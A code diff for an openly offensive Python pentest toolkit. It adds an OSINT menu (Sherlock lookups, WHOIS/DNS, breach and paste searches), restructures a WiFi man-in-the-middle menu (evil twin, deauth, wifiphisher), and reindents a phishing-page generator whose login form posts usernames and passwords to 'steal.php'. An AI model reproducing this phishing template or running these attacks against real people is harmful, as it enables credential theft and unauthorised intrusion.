@@ -62,6 +62,9 @@ class Spinner:
             self.thread.join()
         print("\r" + " " * (len(self.message) + 4) + "\r", end='')
 
+def clear_screen():
+    os.system('cls' if os.name == 'nt' else 'clear')
+
 BANNER = f"""
 {Colors.OKCYAN}
 ██████╗ ███████╗███╗   ██╗████████╗██████╗  █████╗ ██╗  ██╗
@@ -70,7 +73,7 @@ BANNER = f"""
 ██╔═══╝ ██╔══╝  ██║╚██╗██║   ██║   ██╔═══╝ ██╔══██║ ██╔██╗ 
 ██║     ███████╗██║ ╚████║   ██║   ██║     ██║  ██║██╔╝ ██╗
 ╚═╝     ╚══════╝╚═╝  ╚═══╝   ╚═╝   ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝
-              FULL PENTEST TOOLKIT (WSL EDITION)
+              FULL PENTEST TOOLKIT (V1.0)
 
          {Colors.BOLD}Created by astra-incognito{Colors.ENDC}{Colors.OKCYAN}
          GitHub: https://github.com/astra-incognito/
@@ -280,15 +283,15 @@ def phishing_page():
         title = input("Page title: ")
         prompt = input("Prompt text (e.g. Enter your password): ")
         html = f"""
-<html><head><title>{title}</title></head>
-<body>
-<h2>{prompt}</h2>
-<form method='POST' action='steal.php'>
-    <input name='user' placeholder='Username'><br>
-    <input name='pass' type='password' placeholder='Password'><br>
-    <input type='submit'>
-</form></body></html>
-"""
+        <html><head><title>{title}</title></head>
+        <body>
+        <h2>{prompt}</h2>
+        <form method='POST' action='steal.php'>
+            <input name='user' placeholder='Username'><br>
+            <input name='pass' type='password' placeholder='Password'><br>
+            <input type='submit'>
+        </form></body></html>
+        """
     with open(os.path.join(folder, "index.html"), "w") as f:
         f.write(html)
     print(f"[+] Phishing page saved to ./{folder}/index.html")
@@ -890,14 +893,14 @@ def dns_spoof():
         print(f"[-] dnsspoof failed: {e}")
 
 def wifi_mitm_menu():
-    print("""
+    while True:
+        print("""
 [WiFi MITM Attacks]
 1. Evil Twin AP (airbase-ng)
 2. Deauth + Rogue AP (airbase-ng + deauth)
 3. Automated Phishing Portal (wifiphisher)
 0. Back
 """)
-    while True:
         choice = input("[WiFi MITM] Select Option > ").strip()
         if choice == "1":
             evil_twin_ap()
@@ -963,6 +966,124 @@ def wifiphisher_attack():
     except Exception as e:
         print(f"[-] wifiphisher failed: {e}")
 
+def osint_menu():
+    print("""
+[OSINT Toolkit]
+1. Username/Email Enumeration (Sherlock)
+2. Social Media Profile Search
+3. Domain/Company OSINT
+4. Pastebin/Leak Search
+5. OSINT Wordlist Generator
+6. Generate OSINT Report
+0. Back
+""")
+    while True:
+        choice = input("[OSINT] Select Option > ").strip()
+        if choice == "1":
+            sherlock_enum()
+        elif choice == "2":
+            social_media_search()
+        elif choice == "3":
+            domain_osint()
+        elif choice == "4":
+            pastebin_leak_search()
+        elif choice == "5":
+            osint_wordlist_generator()
+        elif choice == "6":
+            osint_report()
+        elif choice == "0":
+            break
+        else:
+            print("Invalid option.")
+
+def sherlock_enum():
+    print("[!] Username/Email Enumeration using Sherlock (if installed)")
+    username = input("Username or email to search: ").strip()
+    if not username:
+        print("[-] No username/email provided.")
+        return
+    if shutil.which("sherlock"):
+        print(f"[+] Running Sherlock for {username}...")
+        subprocess.run(["sherlock", username])
+    else:
+        print("[-] Sherlock not found. Install with: pip install sherlock or git clone https://github.com/sherlock-project/sherlock")
+
+def social_media_search():
+    username = input("Username to search on social media: ").strip()
+    if not username:
+        print("[-] No username provided.")
+        return
+    platforms = {
+        "Twitter": f"https://twitter.com/{username}",
+        "Instagram": f"https://instagram.com/{username}",
+        "GitHub": f"https://github.com/{username}",
+        "LinkedIn": f"https://www.linkedin.com/in/{username}",
+    }
+    print(f"[+] Social media profile URLs for '{username}':")
+    for platform, url in platforms.items():
+        print(f"  {platform}: {url}")
+    print("[!] Open these links in your browser to check for existence and public info.")
+
+def domain_osint():
+    domain = input("Domain or company: ").strip()
+    if not domain:
+        print("[-] No domain provided.")
+        return
+    print(f"[+] WHOIS for {domain}:")
+    whois_lookup(domain)
+    print(f"[+] DNS records for {domain}:")
+    dns_lookup(domain)
+    print(f"[+] Subdomain scan for {domain}:")
+    find_subdomains(domain)
+    # Company info lookup (Clearbit API, if available)
+    try:
+        import requests
+        clearbit_url = f"https://company.clearbit.com/v2/companies/find?domain={domain}"
+        headers = {"Authorization": "Bearer CLEARBIT_API_KEY"}  # User must set their API key
+        r = requests.get(clearbit_url, headers=headers)
+        if r.status_code == 200:
+            print(f"[+] Clearbit company info for {domain}:")
+            print(r.json())
+        else:
+            print("[!] Clearbit info not available or API key not set.")
+    except Exception:
+        print("[!] Clearbit lookup skipped (requests or API key missing).")
+    # HaveIBeenPwned API (better formatting)
+    email = input("Check an email for breaches (optional): ").strip()
+    if email:
+        try:
+            r = requests.get(f"https://haveibeenpwned.com/unifiedsearch/{email}")
+            if r.status_code == 200 and 'No breached account' not in r.text:
+                print(f"[!] Breach found for {email}!")
+                print(r.text)
+            else:
+                print(f"[+] No breach found for {email}.")
+        except Exception as e:
+            print(f"[-] Error checking haveibeenpwned: {e}")
+
+def pastebin_leak_search():
+    query = input("Keyword/email/username/domain to search in public pastes: ").strip()
+    if not query:
+        print("[-] No query provided.")
+        return
+    print(f"[+] Searching public paste sites for '{query}' (basic web search)...")
+    try:
+        url = f"https://www.google.com/search?q=site:pastebin.com+{query}"
+        print(f"[!] Open this in your browser: {url}")
+    except Exception as e:
+        print(f"[-] Error: {e}")
+
+def osint_report():
+    print("[+] Generating OSINT report...")
+    report = []
+    # Example: collect last search results (could be improved with persistent logging)
+    report.append("OSINT Report - Summary\n====================\n")
+    report.append("(Add your findings here as you use the toolkit!)\n")
+    fname = input("Save report as (default osint_report.txt): ").strip() or "osint_report.txt"
+    with open(fname, "w") as f:
+        f.write("\n".join(report))
+    print(f"[+] OSINT report saved as {fname}")
+
 # Split menu into core and advanced
 core_menus = [
     [
@@ -976,6 +1097,7 @@ core_menus = [
         ("8. Subdomain Finder", lambda: find_subdomains(input("Domain: "))),
         ("9. Directory Bruteforce", lambda: dir_bruteforce(input("Base URL (http/https): "))),
         ("10. CVE Search", lambda: cve_lookup(input("Keyword (e.g. apache) or CVE ID (e.g. CVE-2023-1234): "))),
+        ("98. OSINT Toolkit", osint_menu),
         ("99. Next Page", None),
         ("0. Exit", None)
     ],
@@ -1008,6 +1130,10 @@ core_menus = [
 ]
 
 def print_core_menu(page):
+    clear_screen()
+    animated_print(BANNER, delay=0.01)
+    print()
+    typewriter(DISCLAIMER, delay=0.003)
     cprint("\n" + "\n".join([item[0] for item in core_menus[page]]) + "\n", Colors.OKBLUE)
 
 current_page = 0
@@ -1036,4 +1162,4 @@ while True:
                 action()
                 break
     if not found:
-        print("Invalid option.")
+            print("Invalid option.")
